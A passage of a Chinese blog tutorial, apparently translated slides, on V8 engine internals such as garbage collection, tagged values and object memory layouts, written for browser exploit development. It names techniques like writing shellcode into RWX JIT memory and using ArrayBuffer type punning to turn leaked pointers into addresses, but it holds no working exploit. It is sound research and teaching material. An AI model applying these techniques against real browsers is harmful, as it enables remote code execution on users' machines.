alt=""><br>顺便说一下，ToLocalChecked()是一个no-NULL检查函数。</p><p>本节介绍以下内容<br>我只是总结了我不知道的概念<br>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个实例时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><p><strong>我没有很好理解，因为没有真实的信息</strong></p><p>参考</p><ul><li>include/v8-platform.h</li><li>src/libplatform/default-platform.cc</li></ul><h3 id="Interpreter"><a href="#Interpreter" class="headerlink" title="Interpreter"></a>Interpreter</h3><ul><li>In V8, two Interpreters are prepared<ul><li>d8<ul><li>构建src/d8.cc，可以用参数指定各种选项</li><li>debug-shell d8 in the sense of V8</li><li>如果你不用一个文件作为参数去运行它，它将作为interactive interpreter运行。</li><li>当文件被指定为参数时，它将被解析为JavaScript并执行</li></ul></li><li>shell<ul><li>构建samples/shell.cc</li><li>主要操作与d8相同，但功能减少且轻量级</li><li>它可以用于对CTF中的V8的jsp问题进行调试</li></ul></li></ul></li></ul><h3 id="blob"><a href="#blob" class="headerlink" title="blob"></a>blob</h3><ul><li>关于snapshot文件<ul><li>V8在初始化时在内部生成内置JavaScript代码<ul><li>尽管这些代码可以每次使用时进行编译，但是效率不高。</li></ul></li><li>所以在编译阶段预先准备好他们。<ul><li>它只需要在启动时读取，因此初始化变得更快</li><li>在构建V8时，他们一起生成</li></ul></li><li>snapshot可以在程序内部/外部进行<ul><li>当snapshot文件被放置在外部的时候，就是blob</li><li>There are two of natives_blob.bin and snapshot_blob.bin<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-164154.png" alt=""></li></ul></li></ul></li></ul><h3 id="ICU"><a href="#ICU" class="headerlink" title="ICU"></a>ICU</h3><ul><li>International Components for Unicode<ul><li>也就是说，与Unicode有关的外部库</li></ul></li><li>参考下面的链接：<ul><li><a href="https://github.com/v8/v8/wiki/i18n-support" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/i18n-support</a></li><li>src/icu_util.cc</li></ul></li></ul><h3 id="third-party"><a href="#third-party" class="headerlink" title="third_party"></a>third_party</h3><ul><li>和v8捆绑的工具(=被用来构建等)<ul><li>icu, binutils, llvm, etc.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165002.png" alt=""></li></ul></li><li>它可以根据需要进行更换<ul><li>在使用Ubuntu 16.04进行构建时，由于其下属的ld.gold报错，因此通过系统链接程序的符号链接（/usr/bin/ld.gold）<ul><li>ld.gold是Google在2012年左右制作的ld的高速版本</li></ul></li><li>使用GYP_DEFINES，您也可以替换环境变量</li></ul></li></ul><h3 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h3><ul><li>GDB扩展命令已准备好用于调试目的<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165454.png" alt=""><ul><li>gdb-peda$ source tools/gdbinit</li><li>gdb-peda$ source tools/gdb-v8-support.py</li><li>如果你这样做，你可以增加gdb命令<ul><li>也许你可以使用Ok</li></ul></li><li>tools/ Because there are various other things under his eyes</li></ul></li><li>但是，由于我们的案例是在2016年，因此需要进行一些修改<ul><li>gdbinit<ul><li>由于出现与命名空间相关的错误，因此使用“’修补它即可（？？？）</li></ul></li><li>gdb-v8-support.py<ul><li>由于python 3语法错误出现，所以可以在打印语句OK中放入括号<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165926.png" alt=""></li></ul></li><li>此外，该文件的内容在最新的V8中已更改<ul><li>我还没有确认这一点。</li></ul></li></ul></li><li>For example, v8print and job commands display HeapObject cleanly<ul><li>对象的结构将在后面描述</li><li>由于map有各种标志，最好在这里查看<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-173611.png" alt=""></li></ul></li></ul><ol><li>例如，[0xdeadbee，0xdeadbeef，“hoge”]<br>显示FixedArray（减去0x14，因为它指向FixedArray的第一个偏移量）</li><li>我试图显示FixedArray的Map的内容</li><li>实际上，我不必费心使用v8print命令，但我觉得直接调用内部函数可以调用__gdb_print_v8_object（address），如果我传入一个奇怪的地址，我无法通过SEGV恢复它，所以我直接看内存,它会更安全。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>其他的细节<ul><li>Macro-intensive use<ul><li>如果对源代码进行grep找不到定义，则可能有宏</li><li>寻找宏的定义是很好的（在源码中的某处#define 〜）</li><li>In particular, many macros based on the token concatenation operator (##) are used<ul><li><code>#define HOGE(name,type) hoge_name_##type();</code></li><li>当我找不到它时，一般会有很多模式</li></ul></li></ul></li><li><code>__asm __（“int 3”）</code>不能嵌入到IC或机器语言生成系统的功能中<ul><li>做一个blob作为构建过程的一部分</li><li>目前这些代码似乎被使用，并且在很多情况下构建失败</li></ul></li><li>namespace<ul><li>i是v8::internal的别名<ul><li>namespace i = v8::internal;(src/globals.h)</li></ul></li></ul></li><li>Changes will be made immediately<ul><li>你现在看的源码和最新的可能大有不同。<ul><li>如果您认为将其与最新版本进行比较很有趣</li><li><a href="https://cs.chromium.org/chromium/src/v8/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/</a></li></ul></li></ul></li><li>以下是非常有用的<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a></li></ul></li></ul><h2 id="关于V8的GC"><a href="#关于V8的GC" class="headerlink" title="关于V8的GC"></a>关于V8的GC</h2><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/thlorenz/v8-perf/blob/master/gc.md" target="_blank" rel="noopener">https://github.com/thlorenz/v8-perf/blob/master/gc.md</a><br><a href="https://github.com/joyeecheung/v8-gc-talk" target="_blank" rel="noopener">https://github.com/joyeecheung/v8-gc-talk</a><br><a href="https://www.youtube.com/watch?v=DSBLAG2IvsY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DSBLAG2IvsY</a></p><h3 id="垃圾收集器（GC）"><a href="#垃圾收集器（GC）" class="headerlink" title="垃圾收集器（GC）"></a>垃圾收集器（GC）</h3><ul><li>另一个重要组件是GC<ul><li>一种在V8中单独管理JavaScript对象（称为HeapObject）的机制<ul><li>如何检测废弃的对象并自动释放它们</li></ul></li><li>使用与Linux heap不同的区域</li></ul></li><li><p>GC区域</p><ul><li>除heap以外，还有多个由mmap存放的区域</li><li>V8内部使用的各种HeapObject被保留在这个区域<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-025437.png" alt=""></li></ul></li><li><p>heap区域</p><ul><li>如果不是js object（=不应该由GC管理），用c++语言管理普通object</li><li><strong>虽然是一个JavaScript object，但有些例外，存放在heap而不是HeapObject（例如JSArrayBuffer的BackingStore）</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-025736.png" alt=""></li></ul></li></ul><p>GC中有2种generation(= regions with different management methods)</p><ol><li>Young Generation</li><li>Old Generation</li></ol><p>根据GC中object的生存时间，它被分为两类generation ，Young/Old (and New/Old described later)<br>这不是关于V8版本之间的区别<br>除此之外，还有一些区域不属于任何一个generation<br>为了方便起见，它被写为Other，但是其实是关于Large Object Space</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-032534.png" alt=""></p><p>在源代码中，有些地方包含Old generation的large object space的描述，但基本上认为它们是不同的东西</p><h3 id="Young-Generation"><a href="#Young-Generation" class="headerlink" title="Young Generation"></a>Young Generation</h3><ul><li><p>New Space</p><ul><li>新创建的object被保留在这里，并且受到GC管理</li><li>Almost all objects</li><li>code object，map object和large object被排除在外<ul><li>除了看源码之外还有其他的东西，但是从exploit的视角看不重要</li></ul></li></ul></li><li><p>The GC algorithm is Cheney’s algorithm</p><ul><li><p>为了使用这种算法，它进一步分为两个区域</p><ul><li>ToSpace</li><li>FromSpace<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062509.png" alt=""></li></ul></li><li><p>这个GC在源码里被称为Scavenge</p><ul><li><strong>我会解读它，因为它很重要。</strong></li><li>这一次我会解读2016年的GC，但最近这个算法发生了变化，与并行化兼容<br>参考资料：<a href="https://v8project.blogspot.jp/2017/11/" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/11/</a></li></ul></li></ul></li><li>Cheney’s algorithm<ul><li>Each object is reserved from the beginning of ToSpace<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062616.png" alt=""></li><li>当memory exhaustion（空间用罄）时候，GC被调用</li><li>主线程的操作(Javascript执行的线程)被暂停<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062838.png" alt=""></li><li>Switch To Space and From Space</li><li>Actually dealing with pointer swap (flip)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-070014.png" alt=""></li><li>仅将living object复制到To Space<ul><li>首先，确保live (= alive), copy one starting object。<ul><li>有各种各样的root objects (such as global objects, built-in objects, local objects within the scope of living, etc. ）<br>有各种各样的说法，详情请参阅heap/heap.cc的IterateRoots()。</li><li>从Old side可以访问的object (由后面讲解的Write Barrier mechanism管理), etc.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-070702.png" alt=""></li></ul></li><li>顺次复制living的object。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-071307.png" alt=""><ul><li>还有一些要复制到old generation的object<br> <strong>正如我们后面将会看到的那样,两次在young generation的GC中幸存下来的对象，被复制到old generation的空间而不是复制到ToSpace</strong></li></ul></li><li>完成后，重新选择root并重复复制。</li></ul></li><li>再次分配之前未分配完成的obj-e<ul><li>From Space中还有garbage存在，但是因为我们不会再次使用它们，所以无所谓。</li><li>之后，每次GC发生时，都会重复上面这一系列的流程<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-072518.png" alt="">    </li></ul></li></ul></li></ul><h3 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h3><ul><li>old space<ul><li>long-lived objects存放的区域<ul><li>New Space中, 在两次GC之后存活下来的object <ul><li>更多细节参考Heap::ShouldBePromoted()</li></ul></li><li>old space发生GC的频率比new space少（取决于使用过程）<ul><li>如果一个object被移动到old space，该object不会受到GC更改layout的影响<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-191321.png" alt=""></li></ul></li></ul></li></ul></li><li>code space<ul><li>仅适用于JIT的code object<ul><li>由于code object是RWX，因此它从一开始就保留在此区域中<ul><li>由于它是JIT代码，因此不仅要读取（R）写入（W），还要执行（X），因此memory permissions与其他的地方不同。</li></ul></li></ul></li></ul></li><li><p>Map Space</p><ul><li>仅Map object<ul><li>出于GC效率的考虑，Map object从一开始就位于此区域<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-192033.png" alt=""></li></ul></li></ul></li><li><p>old generation的GC算法是Mark-Sweep-Compact</p><ul><li>除New Space区域以外的所有算法</li><li>由于它与Exploit无关，因此省略了详细信息<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-192358.png" alt=""></li></ul></li></ul><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul><li>Large Object Space<ul><li>保留600KB或更大的object的区域<ul><li>它由mmap直接分配</li><li>如果有多个存放区域，请使用链表进行管理</li><li>它不在GC中移动</li></ul></li></ul></li></ul><h3 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h3><ul><li><a href="https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html</a></li><li><p><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a></p></li><li><p>对应于从old/large一侧，指向young一侧的object的场合</p><ul><li>当你在Young进行GC时，Young side的object会移动<ul><li>因此old/large一侧所持有的指针就变成无效的了</li><li>虽然有必要对old/large一侧中的指针进行修正，但是希望在young的gc过程中避免对old/large进行扫描</li></ul></li><li>对这样的指针事先使用store buffer + remembered set进行管理<ul><li>在young进行gc时，利用这些的信息对old/large一侧的指针进行处理<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-071623.png" alt=""></li></ul></li></ul></li></ul><h3 id="从Exploit的角度来看"><a href="#从Exploit的角度来看" class="headerlink" title="从Exploit的角度来看"></a>从Exploit的角度来看</h3><ul><li>In case of exploit repeating memory allocation/release<ul><li>When GC runs at Young Generation, memory layout collapses<ul><li>It is more stable to intentionally activate the GC in advance and move the object as much as possible to Old Generation</li><li>In order to cause GC, it is sufficient to secure a lot of memory (= non-large) in detail</li></ul></li></ul></li><li>In case of heap BOF type exploit<ul><li>Each object does not have metadata for GC (concrete example will be described later)<ul><li>Meta data such as size and prev_size in the malloc chunk are not particularly used for GC applications</li><li>Since the reserved JS object is used like a structure, there are various information inside the JS object, but there are no headers in the JS object itself, and each JS object is secured consecutively</li></ul></li><li>In other words, the technique of the metadata destroying system which is well-known in the Linux heap basically does not exist on the GC<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-081239.png" alt=""></li></ul></li></ul><h2 id="v8对象模型"><a href="#v8对象模型" class="headerlink" title="v8对象模型"></a>v8对象模型</h2><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://steps.dodgson.org/bn/2008/09/07/" target="_blank" rel="noopener">http://steps.dodgson.org/bn/2008/09/07/</a></p><h3 id="V8的object"><a href="#V8的object" class="headerlink" title="V8的object"></a>V8的object</h3><ul><li>Object<ul><li>v8自己创建的各种各样的类<ul><li>和GC合作</li></ul></li><li>针对C++类结构制作一个触发器<ul><li>例如，V8的object没有成员变量</li><li>它既没有虚函数，也没有构造函数/析构函数</li><li></li></ul></li><li>细节参考src/objects.h,src/objects-inl.h等<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-102645.png" alt=""></li></ul></li><li>Exploit<ul><li>了解每个object的内存结构非常重要</li><li>在本文件中，我们将主要讲述下面的内容<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-124349.png" alt=""><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133831.png" alt=""></li></ul></li></ul><h3 id="Object和Tagged-Value"><a href="#Object和Tagged-Value" class="headerlink" title="Object和Tagged Value"></a>Object和Tagged Value</h3><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><ul><li>Object<ul><li>它由以下两种类型组成</li><li>Smi(Small Integer)<ul><li>整数值<ul><li>整数由带符号的31位范围表示（在32位环境的情况下）</li><li>整数由带符号的32位范围表示（在64位环境的情况下）</li></ul></li></ul></li><li>HeapObject<ul><li>除整数值之外的其他类<ul><li>也适用于不能在Smi范围内表达的整数<ul><li>Double value and hold at the end of the pointer (= HeapNumber object)</li></ul></li><li>始终有一个指向Map的指针</li></ul></li><li>由于HeapObject基本上由GC管理，因此它位于GC区域（它不存放在堆区域）</li></ul></li></ul></li></ul><h4 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h4><p>如果一个成员的值是一个整数，那么存储它的速度会更快<br>这就是使用Smi的原因（我认为这是原因）</p><ul><li><p>对于使用指针来创建一个整数对象(B)的实现，如图<br>指针必须被追踪一次，内存访问两次（慢）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-141551.png" alt=""></p></li><li><p>对于省略了指向整数对象(B)的指针并且整数直接存放在内部的实现，如图<br>指针应该指向的整数值在V8中被称为Smi<br>没有必要跟随指针，内存访问执行一次（快速）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-141811.png" alt=""></p></li></ul><h4 id="Tagged-Values"><a href="#Tagged-Values" class="headerlink" title="Tagged Values"></a>Tagged Values</h4><ul><li><p>Tagged Values</p><ul><li>同时表示指向Smi和HeapObject的指针的机制<ul><li>但是，不可能区分它们是整数值还是指针<ul><li>低1位(LSB)是一个标志</li></ul></li></ul></li></ul></li><li><p>Smi(=Object)</p><ul><li>如果LSB为0，则可以通过右移1位获得原始值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073048.png" alt=""></li><li>如果LSB为0，则可以通过右移32位获得原始值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073104.png" alt=""></li></ul></li><li><p>指向HeapObject的指针</p><ul><li>32位<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073143.png" alt=""></li><li>64位<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073127.png" alt=""><br>  由于GC上的chunk在32位环境中的4字节对齐，64位环境中是8字节对齐的，因此LSB始终为0。也就是说，当它存储在内存中时，将其LSB设置为1即代表指针。</li></ul></li></ul><h3 id="HeapNumber"><a href="#HeapNumber" class="headerlink" title="HeapNumber"></a>HeapNumber</h3><ul><li>对象的值为double<ul><li>数字表达式不能在Smi范围内表达</li><li>继承Object, HeapObject<ul><li>内存结构如下所示（64位环境下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-074944.png" alt=""><br>V8的HeapObject完全没有任何成员变量，它完全由偏移量独立表示。<br>为了画起来方便，我们将其视为变量名称，并如右图所示表示（对于后续幻灯片也是如此）</li></ul></li></ul></li><li>实际演示<ul><li>Smi值(0xdeadbee)和double值(0xdeadbeef，由于它大于0x7fffffff，非Smi)存放在数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-080724.png" alt=""><br>搜索</li></ul></li><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索，来查找存储在数组中的值。（换句话说，直接看数组里对应的值就行了）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-081323.png" alt=""></li><li>0xdeadbee（Smi）之后的元素应该是0xdeadbeef（HeapNumber）<br>0x41ebd5b7dde00000是0xdeadbeef的double值表示<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-081433.png" alt=""></li><li>HeapNumber对象和其他对象连续，保证没有任何间隙<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-083012.png" alt=""></li></ul><h3 id="PropertyCell"><a href="#PropertyCell" class="headerlink" title="PropertyCell"></a>PropertyCell</h3><ul><li>Object meaning variable<ul><li>继承Object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084028.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放Smi值(0xdeadbee)</li><li>使用0xdeadbee搜索此PropertyCell的在内存中的位置</li><li>尝试覆盖变量的值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084248.png" alt=""></li><li>由于0xdeadbee是Smi，它的值可以通过在内存中搜索找到。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084529.png" alt=""></li><li>更改为字符串<ul><li>如果你像以前一样检查相同的地址，则kValueOffset所保持的值会更改</li><li>指向的地址是一个表示“hoge”的String对象（String对象的细节将在后面描述）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084737.png" alt=""></li></ul></li></ul></li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul><li>保存字符串的对象<ul><li>继承Object, HeapObject, Name<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-085209.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放在数组中的字符串“hoge”，“fuga”</li><li>用0xdeadbee查找这个数组的内存位置</li><li>由于0xdeadbee是Smi，因此你可以发现这个在数组中的值，通过在内存中搜索。基于此，确定数组的内存位置</li><li>跟在0xdeadbee（Smi）之后的元素应该是一个String对象，如“hoge”或“fuga”<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-124837.png" alt=""></li><li>“hoge”和“fuga”连续存放，没有缺口。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-125413.png" alt=""></li></ul></li></ul><h3 id="Oddball"><a href="#Oddball" class="headerlink" title="Oddball"></a>Oddball</h3><ul><li><p>表示特殊值的对象，例如true，false，undefined</p><ul><li>继承object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）</li></ul></li></ul></li><li><p>实际演示</p><ul><li>确保true，false等在数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133139.png" alt=""></li><li>用0xdeadbee查找这个数组的内存位置</li><li>0xdeadbee（Smi）的下一个元素应该是一个Oddball对象，如true或false<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133222.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133358.png" alt=""></li></ul></li><li>顺便说一下，种类的定义就是这样<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133447.png" alt=""></li></ul><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></p><h4 id="JSObject-1"><a href="#JSObject-1" class="headerlink" title="JSObject"></a>JSObject</h4><ul><li>表示JavaScript对象的对象<ul><li>继承自Object，HeapObject，JSReceiver</li><li>对于想要了解element的properties和description的人，请参阅上面给出的参考链接<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-134206.png" alt=""></li></ul></li><li>properties<ul><li>It is called NamedProperties and manages elements accessed by name. The entity is FixedArray</li><li>Management when an object has a property (like a.x)</li></ul></li><li>element<ul><li>It is called IndexedProperties and manages elements accessed by index. The entity is FixedArray</li><li>Management when an object has an index (like a[0])<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-141036.png" alt=""></li></ul></li></ul><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>Object holding JavaScript function</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li>存放function f()在数组中</li><li>用0xdeadbee查找这个数组的内存位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142310.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142325.png" alt=""></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><ul><li>Object holding a JavaScript array<ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-143216.png" alt=""></li></ul></li></ul></li><li>实际演练<ul><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索来查找存储在数组中的值。 基于此，查找数组的内存位置（因为有一些候选项，请小心）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-155446.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-155649.png" alt=""></li><li>如果增加数组的元素，它将自动扩大<ul><li>第三个和第四个元素被添加到只有两个元素的数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-160146.png" alt=""></li></ul></li><li>当元素的数量增加时，它会扩展长度（FixedArray存放到另一个位置，并且kElementsOffset所保存的指针改变）</li><li>顺便说一下，有很多0x186e00404369代表TheHoleObject的地址（Oddball的kind = 2意思是void）<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-160210.png" alt=""></li></ul></li><li>注意<ul><li>在一个数组中，有时会存储一个double值的情况<ul><li>它是一个非Smi范围，但它被存储为一个double值而不是HeapNumber地址</li><li>Smi范围，但存储为double值而不是Smi表示</li></ul></li><li>Perhaps, it seems to be to decide the type of the entire array and speed up it<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-161601.png" alt=""></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<ul><li>TypedArray是low function，但因为它不会执行额外的操作，所以访问速度很快。</li><li>对于Exploit，最好不要做额外的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-151829.png" alt=""></li></ul></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = 